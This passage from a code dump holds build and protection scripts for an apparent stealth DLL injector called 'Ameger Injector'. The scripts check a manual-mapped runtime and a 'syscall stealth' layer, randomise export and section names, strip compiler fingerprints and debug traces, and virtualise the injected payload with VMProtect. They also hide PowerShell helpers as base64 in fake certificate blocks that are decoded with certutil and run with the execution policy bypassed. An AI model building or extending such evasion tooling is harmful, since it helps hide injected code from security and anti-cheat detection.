powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SYSCALL_SCRIPT%" -Check Payload -Path "%RUNTIME_DLL%"
exit /b %ERRORLEVEL%

:verify_syscall_stealth
if not exist "%VERIFY_SYSCALL_SCRIPT%" exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SYSCALL_SCRIPT%" -Check Stealth -Path "%RUNTIME_DLL%"
exit /b %ERRORLEVEL%

REM Confirms the remote mapping shell is still one contiguous, execute-read block. Takes the image
REM path as an argument because it runs on the pre-mutation linker output, before BuildPE.ps1 has
REM randomised the section names.
:verify_mmap_sections
if not exist "%VERIFY_SYSCALL_SCRIPT%" exit /b 1
set "MMAP_VERIFY_PATH=%~1"
if not defined MMAP_VERIFY_PATH set "MMAP_VERIFY_PATH=%RUNTIME_DLL%"
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SYSCALL_SCRIPT%" -Check MmapSections -Path "%MMAP_VERIFY_PATH%"
exit /b %ERRORLEVEL%

REM Refuses to ship a runtime whose export table still carries a stable, greppable entrypoint
REM name. ShuffleExports.ps1 renames them per build; this is the gate that proves it happened.
:verify_export_names
if not exist "%EXPORTS_SCRIPT%" exit /b 1
where powershell.exe >nul 2>&1
if errorlevel 1 exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%EXPORTS_SCRIPT%" -Path "%~1"
exit /b %ERRORLEVEL%

:remove_import_artifacts
for %%F in ("%~1\*.lib" "%~1\*.exp") do if exist "%%~F" (
  del /f /q "%%~F"
  if exist "%%~F" exit /b 1
)
exit /b 0

:sweep_artifacts
for %%F in ("%DEPS_RELEASE%\Ameger Injector - *.pdb") do if exist "%%~F" (
  move "%%~F" "%CACHE_RUNTIME%\" >nul
  if exist "%%~F" exit /b 1
)
for %%F in ("%OUT64%\*.pdb") do if exist "%%~F" (
  move "%%~F" "%CACHE_INTERFACE%\" >nul
  if exist "%%~F" exit /b 1
)
exit /b 0

:protect_config
if not defined DEPLOYED_SHA (
  echo   %C_RED%Error: Deployed Payload SHA-256 Unavailable; Refusing To Ship An Unpinned Config.%C_RESET%
  exit /b 1
)
if not defined PAYLOAD_NAME (
  echo   %C_RED%Error: Deployed Payload Name Unavailable; Refusing To Ship An Unstamped Config.%C_RESET%
  exit /b 1
)
if not defined RUNTIME_NAME (
  echo   %C_RED%Error: Deployed Runtime Name Unavailable; Refusing To Ship An Unstamped Config.%C_RESET%
  exit /b 1
)
if not defined DLLDIR_NAME (
  echo   %C_RED%Error: Deployed DLL Folder Name Unavailable; Refusing To Ship An Unstamped Config.%C_RESET%
  exit /b 1
)
if not defined EXPORT_MAP (
  echo   %C_RED%Error: Runtime Export Map Unavailable; Refusing To Ship An Unstamped Config.%C_RESET%
  exit /b 1
)
if not defined CONFIG_MAGIC (
  echo   %C_RED%Error: Per-Build Config Magic Unavailable; Refusing To Ship A Static-Magic Config.%C_RESET%
  exit /b 1
)
if /i "%AMEGER_ENCRYPT_CONFIG%"=="0" (
  echo   %C_RED%Error: AMEGER_ENCRYPT_CONFIG=0 Is Refused; The Launcher Rejects Plaintext Configs, So This Would Ship An Unloadable Release.%C_RESET%
  echo   %C_RED%Rebuild without the opt-out to ship the encrypted config.%C_RESET%
  exit /b 1
)
if not exist "%CONFIG_MASTER%" (
  echo   %C_RED%Error: Master Config Not Found: %CONFIG_MASTER%%C_RESET%
  exit /b 1
)
if not exist "%CONFIG_SCRIPT%" (
  echo   %C_RED%Error: ProtectConfig.ps1 Not Found; Refusing To Ship A Plaintext Config.%C_RESET%
  exit /b 1
)
where powershell.exe >nul 2>&1
if errorlevel 1 (
  echo   %C_RED%Error: PowerShell Unavailable; Refusing To Ship A Plaintext Config.%C_RESET%
  exit /b 1
)
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%CONFIG_SCRIPT%" -Source "%CONFIG_MASTER%" -Destination "%DEPLOYED_CONFIG%" -PinPayload "%PAYLOAD_DEST%" -PayloadName "%PAYLOAD_NAME%" -RuntimeName "%RUNTIME_NAME%" -ExportMap "%EXPORT_MAP%" -DllDir "%DLLDIR_NAME%" -ConfigMagic "%CONFIG_MAGIC%"
if errorlevel 1 (
  echo   %C_RED%Error: Config Encryption Failed; Refusing To Ship A Plaintext Config.%C_RESET%
  exit /b 1
)
echo   %C_GREEN%[+]%C_RESET% Config Encrypted = %C_GREEN%%DEPLOYED_CONFIG%%C_RESET%
exit /b 0

:deploy_payload
set "PAYLOAD_SRC=%PAYLOAD_ASSET%"
set "PAYLOAD_IS_PREPARED="
if defined AMEGER_PAYLOAD (
  set "PAYLOAD_SRC=%AMEGER_PAYLOAD%"
  set "PAYLOAD_IS_PREPARED=1"
) else if exist "%PAYLOAD_PROTECTED%" (
  set "PAYLOAD_SRC=%PAYLOAD_PROTECTED%"
  set "PAYLOAD_IS_PREPARED=1"
)
if not exist "%PAYLOAD_SRC%" (
  echo   %C_RED%Error: Payload Asset Not Found: %PAYLOAD_SRC%%C_RESET%
  exit /b 1
)
if defined PAYLOAD_IS_PREPARED echo   %C_YELLOW%[+]%C_RESET% Prepared payload: %C_YELLOW%%PAYLOAD_SRC%%C_RESET%
copy /y "%PAYLOAD_SRC%" "%PAYLOAD_DEST%" >nul
if errorlevel 1 (
  echo   %C_RED%Error: Failed To Copy Payload To %PAYLOAD_DEST%%C_RESET%
  exit /b 1
)
set "DEPLOYED_SHA="
set "DSHA_TMP=%TEMP%\amg_dsha_%RANDOM%%RANDOM%"
set "DSHA_B64=%DSHA_TMP%.b64"
set "DSHA_PS1=%DSHA_TMP%.ps1"
set "DSHA_OUT=%DSHA_TMP%.out"
>"%DSHA_B64%" echo -----BEGIN CERTIFICATE-----
>>"%DSHA_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCldyaXRlLU91dHB1dCAoJ0RFUExPWUVEX1NIQT0nICsgJGgpDQo=
>>"%DSHA_B64%" echo -----END CERTIFICATE-----
certutil -decode "%DSHA_B64%" "%DSHA_PS1%" >nul 2>&1
if errorlevel 1 goto :dsha_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%DSHA_PS1%" -Path "%PAYLOAD_DEST%" >"%DSHA_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%DSHA_OUT%") do set "%%A=%%B"
:dsha_cleanup
if exist "%DSHA_PS1%" del /f /q "%DSHA_PS1%" >nul 2>&1
if exist "%DSHA_B64%" del /f /q "%DSHA_B64%" >nul 2>&1
if exist "%DSHA_OUT%" del /f /q "%DSHA_OUT%" >nul 2>&1
if not defined DEPLOYED_SHA (
  echo   %C_RED%Error: Unable To Hash The Deployed Payload.%C_RESET%
  exit /b 1
)
if not defined PAYLOAD_IS_PREPARED (
  powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check PayloadHash -Path "%PAYLOAD_DEST%" -Config "%CONFIG_MASTER%"
  if errorlevel 1 (
    echo   %C_RED%Error: Deployed Payload Failed Hash Verification.%C_RESET%
    echo     The pristine asset %PAYLOAD_ASSET% does not match the master PayloadSha256 pin.
    echo     If you intentionally swapped the payload, refresh the pin and rebuild:
    echo         Create.bat repin
    echo     Or ship the changed DLL without touching the master pristine pin:
    echo         set AMEGER_PAYLOAD=path\to.dll  and rerun Create.bat
    echo         or copy it to "%PAYLOAD_PROTECTED%"
    exit /b 1
  )
) else (
  echo   %C_YELLOW%[+]%C_RESET% Prepared payload deployed; master pin left pristine.%C_RESET%
)
echo   %C_GREEN%[+]%C_RESET% Payload deployed: %C_GREEN%%PAYLOAD_DEST%%C_RESET%
exit /b 0

:write_section_manifest
set "MANIFEST=%RELEASE_CACHE%\pe-sections.txt"
set "MANIF_TMP=%TEMP%\amg_manif_%RANDOM%%RANDOM%"
set "MANIF_B64=%MANIF_TMP%.b64"
set "MANIF_PS1=%MANIF_TMP%.ps1"
set "MANIF_RC=1"
>"%MANIF_B64%" echo -----BEGIN CERTIFICATE-----
>>"%MANIF_B64%" echo cGFyYW0oW3N0cmluZ10kSW50ZXJmYWNlRXhlLCBbc3RyaW5nXSRQYXlsb2FkLCBbc3RyaW5nXSRNYW5pZmVzdCkNCiRvdXQgPSBAKCkNCmZvcmVhY2ggKCRwIGluIEAoJEludGVyZmFjZUV4ZSwgJFBheWxvYWQpKSB7DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApKSB7IGV4aXQgMSB9DQogICAgJGIgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkcCkNCiAgICAkZSA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRiLCAweDNDKQ0KICAgICRjID0gJGUgKyA0DQogICAgJG4gPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJGIsICRjICsgMikNCiAgICAkeiA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkYiwgJGMgKyAxNikNCiAgICAkcyA9ICRjICsgMjAgKyAkeg0KICAgICRuYW1lcyA9IEAoKQ0KICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJG47ICRpKyspIHsNCiAgICAgICAgJG8gPSAkcyArIDQwICogJGkNCiAgICAgICAgJG5tID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJGIsICRvLCA4KS5UcmltKFtjaGFyXTApDQogICAgICAgICR4ID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRiLCAkbyArIDM2KQ0KICAgICAgICBpZiAoJHggLWJhbmQgMHgyMDAwMDAwMCkgeyAkbmFtZXMgKz0gKCRubSArICcrWCcpIH0gZWxzZSB7ICRuYW1lcyArPSAkbm0gfQ0KICAgIH0NCiAgICAkb3V0ICs9IChbSU8uUGF0aF06OkdldEZpbGVOYW1lKCRwKSArICc6JyArICgkbmFtZXMgLWpvaW4gJywnKSkNCn0NCltJTy5GaWxlXTo6V3JpdGVBbGxMaW5lcygkTWFuaWZlc3QsICRvdXQpDQo=
>>"%MANIF_B64%" echo -----END CERTIFICATE-----
certutil -decode "%MANIF_B64%" "%MANIF_PS1%" >nul 2>&1
if errorlevel 1 goto :manif_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%MANIF_PS1%" -InterfaceExe "%INTERFACE_EXE%" -Payload "%PAYLOAD_DEST%" -Manifest "%MANIFEST%"
set "MANIF_RC=%ERRORLEVEL%"
:manif_cleanup
if exist "%MANIF_PS1%" del /f /q "%MANIF_PS1%" >nul 2>&1
if exist "%MANIF_B64%" del /f /q "%MANIF_B64%" >nul 2>&1
if not "%MANIF_RC%"=="0" exit /b 1
if not exist "%MANIFEST%" exit /b 1
exit /b 0

:scrub_build_cache
if /i "%AMEGER_KEEP_BUILD_CACHE%"=="1" (
  echo   %C_YELLOW%[!]%C_RESET% Build-cache scrub skipped ^(AMEGER_KEEP_BUILD_CACHE=1^); residue retained.
  exit /b 0
)
if not exist "%RELEASE_CACHE%" exit /b 0
set "SCRUB_FAILED="
for /f "delims=" %%F in ('dir /b /a "%RELEASE_CACHE%" 2^>nul') do call :scrub_entry "%%F"
if defined SCRUB_FAILED exit /b 1
echo   %C_GREEN%[+]%C_RESET% Build cache scrubbed; kept pe-sections.txt and Protect state.
echo.
exit /b 0

:scrub_entry
call :scrub_preserved "%~1"
if not errorlevel 1 exit /b 0
rmdir /s /q "%RELEASE_CACHE%\%~1" 2>nul
del /f /q "%RELEASE_CACHE%\%~1" 2>nul
if exist "%RELEASE_CACHE%\%~1" (
  echo   %C_RED%Error: Unable To Remove Build Residue: %RELEASE_CACHE%\%~1%C_RESET%
  set "SCRUB_FAILED=1"
)
exit /b 0

:scrub_preserved
if /i "%~1"=="pe-sections.txt" exit /b 0
if /i "%~1"=="Protect.payload.state" exit /b 0
if /i "%~1"=="Protect.exe.state" exit /b 0
if /i "%~1"=="BuildNames.state" exit /b 0
exit /b 1

:manifest_error
echo   %C_RED%Error: Unable To Record The PE Section Baseline Manifest.%C_RESET%
goto :failure

:scrub_error
echo   %C_RED%Error: Post-Success Build-Cache Scrub Failed; Residue May Remain In %RELEASE_CACHE%.%C_RESET%
goto :failure

:msbuild_error
echo %C_RED%Error: MSBuild Was Not Found.%C_RESET%
goto :failure

:source_error
echo %C_RED%Error: One Or More Required Project Files Are Missing.%C_RESET%
goto :failure

:clean_error
echo %C_RED%Error: Unable To Prepare The Release Or Cache Directory.%C_RESET%
goto :failure

:build_error
echo %C_RED%Error: A Project Build Failed.%C_RESET%
goto :failure

:hash_error
echo %C_RED%Error: Unable To Calculate The Runtime DLL SHA-256.%C_RESET%
goto :failure

:runtime_rename_error
echo %C_RED%Error: Unable To Rename The Runtime DLL To Its Per-Build Name.%C_RESET%
goto :failure

:names_error
echo %C_RED%Error: Unable To Generate The Per-Build Deployed File Names.%C_RESET%
goto :failure

:rename_export_error
echo %C_RED%Error: Unable To Rename The Runtime DLL Exports.%C_RESET%
goto :failure

:names_state_error
echo %C_RED%Error: Unable To Record The Per-Build Name State.%C_RESET%
goto :failure

:verify_error
echo %C_RED%Error: One Or More Expected Binaries Are Missing.%C_RESET%
goto :failure

:verify_content_error
echo %C_RED%Error: Content Verification Failed (Embedded Runtime Hash, Config Magic, Deployed Pin, Per-Build Config Key, Syscall/Stealth Layer, Or Mmap Section Merge).%C_RESET%
goto :failure

:cleanup_error
echo %C_RED%Error: Unable To Remove Generated Import Artifacts.%C_RESET%
goto :failure

:config_error
echo %C_RED%Error: Unable To Deploy An Encrypted Configuration.%C_RESET%
goto :failure

:payload_error
echo %C_RED%Error: Unable To Deploy The Target Payload.%C_RESET%
goto :failure

:mutate_fatal
echo %C_RED%Error: Unable To Mutate The Runtime DLL; Refusing To Continue With An Inconsistent Build.%C_RESET%
goto :failure

:mutate_exe_error
echo %C_RED%Error: Interface PE Mutation Failed Or BuildPE.ps1 Was Not Found; Refusing To Continue With An Inconsistent Build.%C_RESET%
goto :failure

:refuse_unmutated
echo.
echo %C_RED%Error: AMEGER_REFUSE_UNMUTATED=1 Would Ship Unmutated Binaries (Stable Timestamps, MSVC Rich Fingerprint, Standard Section Names, PDB Debug Directory). Refusing: Rebuild Without The Bypass For Any Shipped Build.%C_RESET%
goto :failure

:maybe_adopt_payload
if not exist "%PAYLOAD_ASSET%" exit /b 0
if not exist "%CONFIG_MASTER%" exit /b 0
if not exist "%VERIFY_SCRIPT%" exit /b 0
where powershell.exe >nul 2>&1
if errorlevel 1 exit /b 0

powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check PayloadHash -Path "%PAYLOAD_ASSET%" -Config "%CONFIG_MASTER%" >nul 2>&1
if not errorlevel 1 exit /b 0

echo.
echo   %C_YELLOW%[!]%C_RESET% The Payload Asset Does Not Match The Master PayloadSha256 Pin:
echo       Asset  = %C_YELLOW%%PAYLOAD_ASSET%%C_RESET%
echo       Config = %C_YELLOW%%CONFIG_MASTER%%C_RESET%
if /i not "%AMEGER_AUTO_REPIN%"=="1" (
  echo.
  echo   %C_RED%Refusing To Continue With A Payload The Master Config Does Not Describe.%C_RESET%
  echo   The Deployed Pin Would Describe A DLL That Is Not The One Being Shipped, And
  echo   The Only Thing That Would Hide The Mismatch Is Rewriting The Master Pin.
  echo.
  echo   If The Asset Was Replaced Intentionally, Adopt It Explicitly:
  echo       Create.bat repin
  echo   Or Ship A One-Off DLL Without Touching The Master Pin:
  echo       set AMEGER_PAYLOAD=path\to\dll  and rerun Create.bat
  echo   To Restore The Previous Behaviour Of Adopting The Asset Automatically:
  echo       set AMEGER_AUTO_REPIN=1  and rerun Create.bat
  exit /b 1
)
if not exist "%REPIN_SCRIPT%" (
  echo   %C_RED%Error: AMEGER_AUTO_REPIN=1 But RepinPayload.ps1 Was Not Found.%C_RESET%
  exit /b 1
)
echo   %C_YELLOW%[!]%C_RESET% AMEGER_AUTO_REPIN=1: Re-Pinning The Master Config To The Current Asset.
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%REPIN_SCRIPT%" -Config "%CONFIG_MASTER%" -Payload "%PAYLOAD_ASSET%" -Quiet
if errorlevel 1 (
  echo   %C_RED%Error: Could Not Re-Pin The Master To The Current Payload Asset.%C_RESET%
  exit /b 1
)
exit /b 0

:repin_payload
if not exist "%CONFIG_MASTER%" (
  echo   %C_RED%Error: Master Config Not Found: %CONFIG_MASTER%%C_RESET%
  goto :failure
)
if not exist "%REPIN_SCRIPT%" (
  echo   %C_RED%Error: RepinPayload.ps1 Not Found; Refusing To Re-Pin.%C_RESET%
  goto :failure
)
where powershell.exe >nul 2>&1
if errorlevel 1 (
  echo   %C_RED%Error: PowerShell Unavailable; Cannot Re-Pin.%C_RESET%
  goto :failure
)
set "REPIN_SRC=%PAYLOAD_ASSET%"
if defined AMEGER_PAYLOAD set "REPIN_SRC=%AMEGER_PAYLOAD%"
if not exist "%REPIN_SRC%" (
  echo   %C_RED%Error: Payload Asset Not Found: %REPIN_SRC%%C_RESET%
  goto :failure
)
echo   Repinning master pin for: %C_YELLOW%%REPIN_SRC%%C_RESET%
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%REPIN_SCRIPT%" -Config "%CONFIG_MASTER%" -Payload "%REPIN_SRC%"
if errorlevel 1 goto :failure
goto :repin_success

:repin_success
echo.
echo   %C_GREEN%[+]%C_RESET% Master Configuration.ini re-pinned. Re-run Create.bat to deploy the new payload.
if "%NO_PAUSE%"=="0" pause
exit /b 0

:failure
if "%NO_PAUSE%"=="0" pause
exit /b 1

```

### Build/Executors/Protect.bat â€” 131 lines â€” sha12:612D92A9A964
```bat
@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "NO_PAUSE=0"
if defined CREATE_NO_PAUSE set "NO_PAUSE=%CREATE_NO_PAUSE%"
for %%A in (%*) do if /i "%%A"=="/nopause" set "NO_PAUSE=1"

set "C_RESET="
set "C_GREEN="
set "C_RED="
set "C_YELLOW="
if /i not "%AMEGER_NO_COLOR%"=="1" for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
if defined ESC (
    set "C_RESET=%ESC%[0m"
    set "C_GREEN=%ESC%[92m"
    set "C_RED=%ESC%[91m"
    set "C_YELLOW=%ESC%[93m"
)

for %%I in ("%~dp0..\..") do set "ROOT=%%~fI"
set "BUILD_DIR=%ROOT%\Build"
set "OUT_ROOT=%BUILD_DIR%\Release"
set "STAGE_DIR=%BUILD_DIR%\Executors\Protection"
set "PROTECT_DLL=%STAGE_DIR%\ProtectDLL.bat"
set "PROTECT_EXE=%STAGE_DIR%\ProtectEXE.bat"
set "NAMES_STATE=%OUT_ROOT%\Cache\BuildNames.state"
set "PAYLOAD_NAME="
set "EXE_NAME="

set "STAGE=%~1"
if /i "%STAGE%"=="/nopause" set "STAGE="
if defined STAGE (
  if /i not "%STAGE%"=="dll" if /i not "%STAGE%"=="exe" (
    echo %C_RED%Error: Unknown Stage "%STAGE%"; Use DLL Or EXE.%C_RESET%
    goto :usage_error
  )
)

set "DLL_DIR_NAME="
set "PAYLOAD_DEST="

if not exist "%OUT_ROOT%" (
  echo   %C_RED%Error: Release Folder Not Found: %OUT_ROOT%%C_RESET%
  echo   %C_RED%       Run Create.bat Before Protecting Anything.%C_RESET%
  goto :failure
)
if not exist "%PROTECT_DLL%" (
  echo   %C_RED%Error: Missing Stage Script: %PROTECT_DLL%%C_RESET%
  goto :failure
)
if not exist "%PROTECT_EXE%" (
  echo   %C_RED%Error: Missing Stage Script: %PROTECT_EXE%%C_RESET%
  goto :failure
)

echo [%C_GREEN%1%C_RESET%/%C_GREEN%3%C_RESET%] Preparing...
echo.
echo   %C_GREEN%[+]%C_RESET% Release = %C_GREEN%%OUT_ROOT%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Stages = %STAGE_DIR%
echo   %C_GREEN%[+]%C_RESET% Runtime =   %C_YELLOW%Skipped By Design (Manual-Mapped)%C_RESET%
echo.
echo.

set "DLL_RESULT=skipped"
set "EXE_RESULT=skipped"

if defined STAGE if /i "%STAGE%"=="exe" goto :run_exe

echo [%C_GREEN%2%C_RESET%/%C_GREEN%3%C_RESET%] Protecting Payload...
echo.
call "%PROTECT_DLL%" /nopause
if errorlevel 1 (
  set "DLL_RESULT=failed"
  goto :summarize
)
set "DLL_RESULT=ok"

:run_exe
if defined STAGE if /i "%STAGE%"=="dll" goto :summarize
echo [%C_GREEN%2%C_RESET%/%C_GREEN%3%C_RESET%] Protecting Launcher...
echo.
call "%PROTECT_EXE%" /nopause
if errorlevel 1 (
  set "EXE_RESULT=failed"
  goto :summarize
)
set "EXE_RESULT=ok"

:summarize
if exist "%NAMES_STATE%" for /f "usebackq tokens=1,* delims==" %%A in ("%NAMES_STATE%") do (
  if /i "%%A"=="PAYLOAD_NAME" if not defined PAYLOAD_NAME set "PAYLOAD_NAME=%%B"
  if /i "%%A"=="EXE_NAME" if not defined EXE_NAME set "EXE_NAME=%%B"
  if /i "%%A"=="DLLDIR_NAME" if not defined DLL_DIR_NAME set "DLL_DIR_NAME=%%B"
)
if defined DLL_DIR_NAME if exist "%OUT_ROOT%\%DLL_DIR_NAME%\%PAYLOAD_NAME%" set "PAYLOAD_DEST=%OUT_ROOT%\%DLL_DIR_NAME%\"
if not defined PAYLOAD_DEST if defined PAYLOAD_NAME for /f "delims=" %%F in ('dir /b /s /a-d "%OUT_ROOT%\%PAYLOAD_NAME%" 2^>nul') do if not defined PAYLOAD_DEST set "PAYLOAD_DEST=%%~dpF"
echo.
echo [%C_GREEN%3%C_RESET%/%C_GREEN%3%C_RESET%] Summary...
echo.
call :report "Payload" "%DLL_RESULT%"
call :report "Launcher" "%EXE_RESULT%"
echo.
if /i "%DLL_RESULT%"=="failed" goto :stage_failed
if /i "%EXE_RESULT%"=="failed" goto :stage_failed
echo Protection Completed Successfully.
echo.
if defined PAYLOAD_DEST (
  echo   Payload      = %C_GREEN%%PAYLOAD_DEST%%PAYLOAD_NAME%%C_RESET%
) else if defined PAYLOAD_NAME (
  echo   Payload      = %C_GREEN%%OUT_ROOT%\%PAYLOAD_NAME%%C_RESET%
) else (
  echo   Payload      = %C_YELLOW%Deployed Name State Unavailable; See The Payload Stage Above%C_RESET%
)
if defined EXE_NAME (
  echo   Interface x64 = %C_GREEN%%OUT_ROOT%\%EXE_NAME%.exe%C_RESET%
) else (
  echo   Interface x64 = %C_GREEN%%OUT_ROOT%\*.exe%C_RESET%
)
echo.
if not defined STAGE if exist "%NAMES_STATE%" del /f /q "%NAMES_STATE%" >nul 2>&1
if "%NO_PAUSE%"=="0" pause
exit /b 0

:report
if /i "%~2"=="ok" (
  echo   %C_GREEN%OK%C_RESET%    %~1
  exit /b 0
)
if /i "%~2"=="skipped" (
  echo   %C_YELLOW%-  %C_RESET%   %~1 ^(skipped^)
  exit /b 0
)
echo   %C_RED%Fail%C_RESET%  %~1
exit /b 0

:stage_failed
echo.
echo %C_RED%Protection Failed; The Release Is Not Shippable.%C_RESET%
goto :failure

:usage_error
if "%NO_PAUSE%"=="0" pause
exit /b 1

:failure
if "%NO_PAUSE%"=="0" pause
exit /b 1

```

### Build/Executors/Protection/ProtectDLL.bat â€” 574 lines â€” sha12:5F91DCF0762B
```bat
@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "NO_PAUSE=0"
if defined CREATE_NO_PAUSE set "NO_PAUSE=%CREATE_NO_PAUSE%"
if /i "%~1"=="/nopause" set "NO_PAUSE=1"

set "C_RESET="
set "C_GREEN="
set "C_RED="
set "C_YELLOW="
if /i not "%AMEGER_NO_COLOR%"=="1" for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
if defined ESC (
    set "C_RESET=%ESC%[0m"
    set "C_GREEN=%ESC%[92m"
    set "C_RED=%ESC%[91m"
    set "C_YELLOW=%ESC%[93m"
)

for %%I in ("%~dp0..\..\..") do set "ROOT=%%~fI"
set "BUILD_DIR=%ROOT%\Build"
set "OUT_ROOT=%BUILD_DIR%\Release"
set "RELEASE_CACHE=%OUT_ROOT%\Cache"
set "WORK_DIR=%RELEASE_CACHE%\Protect"
set "ASSET_TPL=%ROOT%\Assets\Template"
set "SCRIPTS_DIR=%BUILD_DIR%\Scripts"
set "BUILD_VMP_SCRIPT=%SCRIPTS_DIR%\BuildVMP.ps1"
set "STRIP_SCRIPT=%SCRIPTS_DIR%\StripExportDirs.ps1"
set "STATE_FILE=%RELEASE_CACHE%\Protect.payload.state"
set "CONFIG_MASTER=%BUILD_DIR%\Configuration.ini"
set "PAYLOAD_ASSET=%ROOT%\Assets\DLL\Jlov.dll"
set "CONFIG_SCRIPT=%SCRIPTS_DIR%\ProtectConfig.ps1"
set "DEPLOYED_CONFIG="
set "NAMES_STATE=%RELEASE_CACHE%\BuildNames.state"
set "PAYLOAD_ORIGINAL_NAME=Jlov.dll"
set "PAYLOAD_NAME="
set "RUNTIME_NAME="
set "VMP_PROJECT="
set "TARGET_NAME="
set "VMP_CON="

echo [%C_GREEN%1%C_RESET%/%C_GREEN%6%C_RESET%] Locating VMProtect Console...
echo.
call :find_vmp_con
if errorlevel 2 goto :vmp_wrapper
if errorlevel 1 goto :vmp_missing
echo   %C_GREEN%[+]%C_RESET% Console = %C_GREEN%%VMP_CON%%C_RESET%
echo.
echo.

echo [%C_GREEN%2%C_RESET%/%C_GREEN%6%C_RESET%] Resolving Payload Target...
echo.
call :read_names_state
if errorlevel 1 goto :names_missing
if defined DLLDIR_NAME (
  set "DLL_DIR=%OUT_ROOT%\%DLLDIR_NAME%"
) else (
  set "DLL_DIR=%OUT_ROOT%\DLLs"
)
if defined CONFIG_NAME (
  set "DEPLOYED_CONFIG=%OUT_ROOT%\%CONFIG_NAME%.ini"
) else (
  set "DEPLOYED_CONFIG=%OUT_ROOT%\Configuration.ini"
)
if not exist "%DLL_DIR%" (
  echo   %C_RED%Error: Release DLL Folder Not Found: %DLL_DIR%%C_RESET%
  goto :failure
)
set "TARGET="
set "DLL_CANDIDATES=0"
for %%F in ("%DLL_DIR%\*.dll") do call :consider_dll "%%~fF"
if not defined TARGET goto :target_missing
if not exist "%TARGET%" goto :target_missing
if not "%DLL_CANDIDATES%"=="1" goto :target_ambiguous
for %%N in ("%TARGET%") do set "TARGET_NAME=%%~nxN"
echo   %C_GREEN%[+]%C_RESET% Target      = %C_GREEN%%TARGET%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Skipped     = %C_YELLOW%%RUNTIME_NAME% (Manual-Mapped)%C_RESET%
echo.
call :check_already_protected
if defined VMP_PRESENT (
  if /i not "%AMEGER_FORCE_VMP%"=="1" (
    echo   %C_GREEN%[+]%C_RESET% Already Protected ^(segment %C_YELLOW%%VMP_PRESENT%%C_RESET%^); Skipping.
    echo   %C_YELLOW%       Set AMEGER_FORCE_VMP=1 To Virtualize Anyway.%C_RESET%
    goto :already_protected
  )
)
if not defined VMP_PROBE_OK if /i not "%AMEGER_FORCE_VMP%"=="1" (
  echo   %C_RED%Error: Could Not Probe The Payload For Existing VMProtect Sections.%C_RESET%
  echo   %C_RED%       Refusing To Re-Virtualize A Possibly-Protected Binary; Set AMEGER_FORCE_VMP=1 To Proceed.%C_RESET%
  goto :failure
)
echo.
echo.

echo [%C_GREEN%3%C_RESET%/%C_GREEN%6%C_RESET%] Resolving VMProtect Project...
echo.
call :find_project
if errorlevel 1 goto :project_missing
echo   %C_GREEN%[+]%C_RESET% Project      = %C_GREEN%%VMP_PROJECT%%C_RESET%
echo.
call :check_project_input
if errorlevel 1 goto :project_mismatch
call :vmp_settings
echo.
call :read_state
echo.
if /i "%STATE_MATCH%"=="output" (
  echo   %C_GREEN%[+]%C_RESET% Already Protected; Nothing To Do.
  goto :already_done
)
if /i "%STATE_MATCH%"=="unknown" (
  echo   %C_YELLOW%[+]%C_RESET% No Prior State Recorded; Protecting Now.
) else (
  echo   %C_GREEN%[+]%C_RESET% Source Matches Recorded Build; Protecting.
)
echo.
echo.

echo [%C_GREEN%4%C_RESET%/%C_GREEN%6%C_RESET%] Virtualizing Payload...
echo.
call :clean_work
if errorlevel 1 goto :work_error
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
if not exist "%WORK_DIR%" goto :work_error
call :sha256_of "%TARGET%" SRC_SHA
if errorlevel 1 goto :hash_error
if not defined SRC_SHA goto :hash_error
echo   Source SHA-256 = %C_GREEN%%SRC_SHA%%C_RESET%
call :prepare_project
if errorlevel 1 goto :project_error
echo   %C_GREEN%[+]%C_RESET% Segment Name = %C_GREEN%%SEG_NAME%%C_RESET% %C_YELLOW%(Randomized Per Build)%C_RESET%
call :run_vmp
if errorlevel 1 goto :pack_only_fallback
goto :vmp_done
:pack_only_fallback
echo   %C_YELLOW%[!]%C_RESET% Function virtualization failed; falling back to packing-only.
call :tail_log
call :prepare_project -PackOnly
if errorlevel 1 goto :project_error
echo   %C_GREEN%[+]%C_RESET% Segment Name = %C_GREEN%%SEG_NAME%%C_RESET% %C_YELLOW%(Pack-Only, Refreshed)%C_RESET%
call :run_vmp
if errorlevel 1 (
  echo   %C_RED%Error: VMProtect Reported A Failure; See The Log Tail Below.%C_RESET%
  call :tail_log
  goto :failure
)
:vmp_done
call :validate_output
if errorlevel 2 goto :fc_error
if errorlevel 1 goto :output_invalid
echo.
